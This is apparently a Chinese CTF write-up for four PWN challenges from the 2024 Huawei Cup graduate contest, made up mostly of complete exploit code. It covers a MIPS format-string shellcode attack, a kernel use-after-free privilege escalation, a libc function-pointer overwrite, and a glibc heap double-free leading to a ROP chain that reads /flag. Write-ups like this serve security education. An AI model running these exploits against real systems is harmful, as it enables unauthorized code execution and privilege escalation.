---
id: cpipc-2024
aliases: []
tags:
  - WriteUp
  - PWN
date: 2024-10-10 15:28
draft: false
title: WriteUp - 华为杯研赛 2024 - PWN
---

> [!NOTE]
> AK 了。
>
> 令人感叹，决赛还是要面对渗透赛。不过这次还有 AWDP 赛道，不至于像羊城杯那么坐牢。

附件在我的 github 仓库里可以找到： [ctf-writeup-collection](https://github.com/AvavaAYA/ctf-writeup-collection/blob/main/README.md)

## mips_fmt

mips 32 位大端的题，有无限循环的格式化字符串，也就意味着可以无限构造 payload，因此这就变成一道编程题：

1. 先实现格式化字符串向栈上写入数据的能力；
2. 再把 shellcode 布置到栈上，同时改写返回地址。

> [!important]
> 这里是因为 mips 没有实现 NX 的能力，所以栈也是可执行的。在测试格式化字符串的过程中可以注意到，mips32 函数的前四个参数依次放在 A0、A1、A2、A3 寄存器中，剩下的放在栈上。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from lianpwn import *

# io = process(["qemu-mips", "-g", "12345", "pwn"])
# io = process(["qemu-mips", "pwn"])
io = remote("192.168.18.27", 9999)
elf = ELF("./pwn")

context.log_level = "debug"
context.arch = "mips"
context.endian = "big"
context.bits = 32
context.terminal = ["tmux", "sp", "-h", "-l", "140"]


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


class strFmt_new:
    def __init__(self):
        self.current_n = 0

    def generate_hhn_payload(self, distance, hhn_data):
        hhn_data = hhn_data & 0xFF
        offset = (distance // 4) + 6
        if hhn_data > self.current_n:
            temp = hhn_data - self.current_n
        elif hhn_data < self.current_n:
            temp = 0x100 - self.current_n + hhn_data
        elif hhn_data == self.current_n:
            return b"%" + i2b(offset) + b"$hhn"
        self.current_n = hhn_data
        return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"


# a1, a2, a3, sp+0x10...

ru(b">> \n")
payload = b"%p."
s(payload)
stack_base = int(ru(b".", drop=True), 16)
lg("stack_base", stack_base)


def change_word(offset, one_2B_data):
    fmt = strFmt_new()
    ru(b">> \n")
    payload = fmt.generate_hhn_payload(0x18, (one_2B_data >> 8) & 0xFF)
    payload += fmt.generate_hhn_payload(0x1C, one_2B_data & 0xFF)
    lg("len(payload)", len(payload))
    assert len(payload) <= 0x20 - 0x8
    payload = payload.ljust(0x20 - 0x8, b"\x00")
    payload += p32(stack_base + offset)
    payload += p32(stack_base + offset + 1)
    s(payload)


def construct_ROP(off, one_4B_data):
    change_word(off * 4 + 0x24, (one_4B_data >> 16) & 0xFFFF)
    change_word(off * 4 + 0x24 + 2, one_4B_data & 0xFFFF)


shellcode = asm(shellcraft.sh()) + asm("nop")
shellcode_list = [u32((shellcode[k * 4 :])[:4]) for k in range(len(shellcode) // 4)]
print(shellcode_list)

construct_ROP(0, stack_base + 0x28)

for x in range(len(shellcode_list)):
    construct_ROP(x + 1, shellcode_list[x])

ru(b">> \n")
sl(b"exit")

ia()

# 4c87688354a546ecadd6d437b60306a5
```

---

## kernel-network

> [!INFO]
> 虽然一次比一次抽象，不过也算是我连续第三场比赛 AK kernel 题。

拿到题发现 `HRPUAF.ko` 之外还有个 `net.ko`，前者逻辑很直接，直白的 UAF。

`net.ko` 里面比较奇怪，因为发送原始网络包通常需要 root 权限，因此可以把它理解成 `readflag`，和利用没什么关系。

可以先写个简单的 getflag.c：

```c
// get flag
#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define ETH_HDRLEN 14

int main(int argc, char *argv[]) {
    int sockfd;
    struct ifreq if_idx;
    struct ifreq if_mac;
    char if_name[IFNAMSIZ];
    char sendbuf[60];  // 最小以太网帧长度为60字节
    struct ether_header *eh = (struct ether_header *)sendbuf;
    struct sockaddr_ll socket_address;
    int frame_length = 60;  // 发送帧的总长度

    // 检查命令行参数
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    strncpy(if_name, argv[1], IFNAMSIZ - 1);
    if_name[IFNAMSIZ - 1] = '\0';

    // 打开原始套接字
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // 获取接口索引
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, if_name, IFNAMSIZ - 1);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // 获取接口的 MAC 地址
    memset(&if_mac, 0, sizeof(struct ifreq));
    strncpy(if_mac.ifr_name, if_name, IFNAMSIZ - 1);
    if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
        perror("SIOCGIFHWADDR");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // 构造以太网头部
    // 目标 MAC 地址：广播地址
    memset(eh->ether_dhost, 0xff, ETH_ALEN);
    // 源 MAC 地址：使用接口的 MAC 地址
    memcpy(eh->ether_shost, if_mac.ifr_hwaddr.sa_data, ETH_ALEN);
    // Ethertype：0x0800（IPv4）
    eh->ether_type = htons(0x0800);

    // 构造负载
    memset(sendbuf + ETH_HDRLEN, 0x00,
           frame_length - ETH_HDRLEN);  // 初始化负载为0

    // 设置特定字节以满足后门条件
    // 注意：索引从0开始，整个帧的字节0-13为以太网头部，14开始为负载

    // 需要设置的字节位置相对于整个帧：
    // data[30] = 0xC0 --> sendbuf[30]
    // data[31] = 0xA8 --> sendbuf[31]
    // data[32] = 123   --> sendbuf[32]
    // data[33] = 1     --> sendbuf[33]
    // data[38] = 82    --> sendbuf[38]
    // data[39] = 0xBF  --> sendbuf[39]
    // data[40] = 1     --> sendbuf[40]

    // 检查帧长度是否足够
    if (frame_length < 41) {
        fprintf(stderr, "Frame length too short. Must be at least 41 bytes.\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // 设置特定字节
    sendbuf[30] = 0xC0;  // data[30]
    sendbuf[31] = 0xA8;  // data[31]
    sendbuf[32] = 123;   // data[32]
    sendbuf[33] = 1;     // data[33]
    sendbuf[38] = 82;    // data[38]
    sendbuf[39] = 0xBF;  // data[39]
    sendbuf[40] = 1;     // data[40]

    // 打印构造的帧内容（可选，用于调试）
    printf("Constructed Ethernet Frame:\n");
    for (int i = 0; i < frame_length; i++) {
        printf("%02x ", (unsigned char)sendbuf[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // 构造目标地址结构
    memset(&socket_address, 0, sizeof(struct sockaddr_ll));
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;
    // 目标 MAC 地址：广播地址
    memset(socket_address.sll_addr, 0xff, ETH_ALEN);

    // 发送帧
    if (sendto(sockfd, sendbuf, frame_length, 0,
               (struct sockaddr *)&socket_address,
               sizeof(struct sockaddr_ll)) < 0) {
        perror("sendto");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Ethernet frame sent successfully.\n");

    close(sockfd);
    return 0;
}
```

接下来打 LPE，直接参考上古入门题 babydriver 就行了（看到内核版本 4.4.72 就猜到是这种题了）：

```c
// exp.c
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    int fd1 = open("/dev/test", 2);
    int fd2 = open("/dev/test", 2);

    ioctl(fd1, 0, 0xa8);
    close(fd1);

    int pid = fork();

    if (pid < 0) {
        exit(-1);
    } else if (pid == 0) {

        char buf[30] = {0};
        write(fd2, buf, 28);
        system("/bin/sh");
        return 0;
    } else {
        wait(NULL);
    }

    return 0;
}
```

musl 静态编译上传后依次运行 `./lpe ; ./getflag virnet0` 获得 flag。

---

## cancanneed_new

这道题比较抽象，在 gift 功能中会将 libc 里的一段只读区域设置为可写的，可以通过爆破 + 调试找到其中在 exit 时会调用的函数指针，覆写为 `one_gadget` 实现利用。

> [!info]
> 这里很麻烦的一点是 gift 函数里限时 10 秒，但是交互 1000 次需要不少时间，远程总是差一点，跑很多遍终于出来了

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwn import *

io = remote("192.168.18.21", 9999)
# io = process("./pwn")

context.log_level = "info"


def ru(a, drop=False):
    return io.recvuntil(a, drop)


lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def cmd(choice):
    ru(b"Your Choice: \n")
    sl(i2b(choice))


def win_gift():
    cmd(666)
    ru(b"But,you have to win it by yourself\n")
    sl(i2b(1))
    for i in range(1000):
        res = eval(ru(b"= ?", drop=True))
        sl(i2b(res))
        if i % 100 == 0:
            lg(b"i", i)
    ru(b"Now,you have earned your award!\n")


def add(size, data):
    cmd(1)
    ru(b"please tell me how much you want to have:\n")
    sl(i2b(size))
    ru(b"Content:\n")
    s(data)


def delet(idx):
    cmd(2)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


def edit(idx, data):
    cmd(3)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))
    ru(b"What do you want?\n")
    s(data)


def show(idx):
    cmd(4)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


for i in range(8):
    add(0x90, b"a")

add(0x90, b"b")
for i in range(8):
    delet(i)
show(7)
ru(b"info:\n")
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x1ECBE0
lg("libc_base", libc_base)

edit(6, p64(libc_base + 0x1E9000 - 0x80 * 15))
add(0x90, b"a")
win_gift()

one_hook = libc_base + 0xE3AFE
lg("one_hook", one_hook)
add(0x90, p64(libc_base + 0xE3AFE) * (0x88 // 8))

cmd(5)
sl(b"cat /flag")

ia()
```

---

## stack_and_heap

上古 2.23 的 UAF 题，malloc hook 的利用很简单，后面要找个 gadget 回到栈上事先布置好的地方打 ROP，注意还要用 openat 绕过对 open 的限制：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

ru(b"egarots esreveR\n")
pop_rdi_ret = 0x0000000000400E53
pop_rbp_ret = 0x00000000004007D8
pop_rsi_2_ret = 0x0000000000400E51
leave_ret = 0x0000000000400954
getN = 0x400956
payload = flat(
    [
        pop_rdi_ret,
        0,
        pop_rsi_2_ret,
        0x602400,
        0,
        elf.sym.read,
        pop_rbp_ret,
        0x602400,
        leave_ret,
    ]
)
sl(payload)


def cmd(choice):
    ru(b">>eciohc ruoy\n")
    sl(i2b(choice))


def add(size, data):
    cmd(1)
    ru(b"?ezis\n")
    sl(i2b(size))
    ru(b"egarots esreveR\n")
    sl(data)


def show(idx):
    cmd(2)
    ru(b"?xedni\n")
    sl(i2b(idx))


def delet(idx):
    cmd(3)
    ru(b"?xedni\n")
    sl(i2b(idx))


add(0x100, b"7")
add(0x100, b"6")
delet(7)
show(7)
ru(b"?ereh\n")
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x3C4B78
assert libc_base > 0
lg("libc_base", libc_base)

fake_fast = libc_base + 0x3C4AED

add(0x60, b"5")
add(0x60, b"4")
add(0x60, b"3")

delet(5)
delet(4)
delet(5)

add(0x60, p64(fake_fast))

add(0x60, b"a")
add(0x60, b"a")

add_rsp_38_ret = libc_base + 0x000000000012B98A

add(0x60, b"a" * 0x13 + p64(add_rsp_38_ret))
cmd(1)
ru(b"?ezis\n")
sl(i2b(10))

pop_rdx_ret = libc_base + 0x0000000000001B92

payload = flat(
    [
        0x602400,
        pop_rdx_ret,
        0x1000,
        elf.plt.read,
    ]
)
s(payload)

pop_rsi_ret = libc_base + 0x00000000000202F8
pop_rax_ret = libc_base + 0x000000000003A738
syscall_ret = libc_base + 0xBC3F5

payload = flat(
    {
        0x00: b"/flag\x00",
        0x20: [
            pop_rdi_ret,
            0,
            pop_rsi_ret,
            0x602400,
            pop_rdx_ret,
            0,
            pop_rax_ret,
            257,
            syscall_ret,
            pop_rdi_ret,
            3,
            pop_rdx_ret,
            0x100,
            pop_rax_ret,
            0,
            syscall_ret,
            pop_rdi_ret,
            1,
            pop_rax_ret,
            1,
            syscall_ret,
        ],
    }
)
debugB()
s(payload)

ia()

# 3abdd3b740284283954b25cbb29eeeb4
```
